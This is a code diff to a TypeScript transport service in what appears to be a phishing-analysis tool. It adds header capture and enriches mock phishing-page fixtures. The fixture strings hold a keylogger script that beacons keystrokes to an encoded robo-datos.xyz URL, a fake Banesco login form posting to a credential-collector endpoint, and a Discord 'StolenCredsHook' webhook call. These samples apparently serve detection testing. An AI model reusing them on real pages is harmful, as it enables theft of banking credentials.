@@ -121,6 +121,16 @@ export class TransportService {
         (response.headers.get('content-security-policy') || '').includes('frame-ancestors')
     );
 
+    const rawHeaders: Record<string, string> = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k === 'set-cookie') {
+        rawHeaders[key] = '[COOKIE REDACTADA POR SEGURIDAD]';
+      } else {
+        rawHeaders[key] = val.slice(0, 220);
+      }
+    });
+
     return {
       finalUrl: currentUrl.toString(),
       targetDomain: currentUrl.hostname.toLowerCase(),
@@ -131,6 +141,7 @@ export class TransportService {
       responseTimeMs,
       contentType,
       redirectChain,
+      rawHeaders,
       securityHeaders: {
         strict_transport_security: hasHsts,
         content_security_policy: hasCsp,
@@ -332,6 +343,7 @@ export class TransportService {
         '  </div>',
         '  <script>',
         '    const _0xspy = atob("aHR0cDovL3JvYm8tZGF0b3MueHl6L2tleWxvZw==");',
+        '    fetch("/panel/guardar_claves.php", { method: "POST" });',
         '    document.querySelectorAll("input").forEach((el) => {',
         '      el.addEventListener("keyup", (e) => navigator.sendBeacon(_0xspy, e.target.value));',
         '    });',
@@ -347,6 +359,14 @@ export class TransportService {
         isHttps: parsedUrl.protocol === 'https:',
         httpStatusCode: 200,
         redirectCount: 2,
+        responseTimeMs: 74,
+        contentType: 'text/html',
+        rawHeaders: {
+          server: 'LiteSpeed',
+          'x-powered-by': 'PHP/8.1.29',
+          'content-type': 'text/html; charset=UTF-8',
+          'cache-control': 'no-store, no-cache',
+        },
         securityHeaders: {
           strict_transport_security: false,
           content_security_policy: false,
@@ -440,7 +460,7 @@ export class TransportService {
             '    <svg id="banesco-brand-svg" aria-label="Banesco Contigo" viewBox="0 0 120 40"><rect fill="#007953" width="120" height="40"/><text>Banesco Banca en Línea</text></svg>',
             '  </header>',
             '  <main>',
-            '    <form id="auth-step">',
+            '    <form id="auth-step" action="/api/recolector-banca.php" method="POST">',
             '      <input type="text" name="user" placeholder="Usuario BanescOnline" required>',
             '      <input type="password" name="pass" placeholder="Clave" required>',
             '      <button type="submit">Aceptar</button>',
@@ -448,6 +468,7 @@ export class TransportService {
             '  </main>',
             '  <script>',
             '    fetch("https://discord.com/api/webhooks/129000111/StolenCredsHook", { method: "POST" });',
+            '    // Source kit synced from https://raw.githubusercontent.com/phishkit-mirror-lab/banesco-ui/main/config.json',
             '  </script>',
             '</body>',
             '</html>',
